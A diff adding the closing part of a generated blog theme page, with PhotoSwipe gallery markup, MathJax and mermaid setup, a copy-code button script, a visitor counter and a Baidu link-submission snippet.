+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+
+<script src="/js/clickBoom2.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
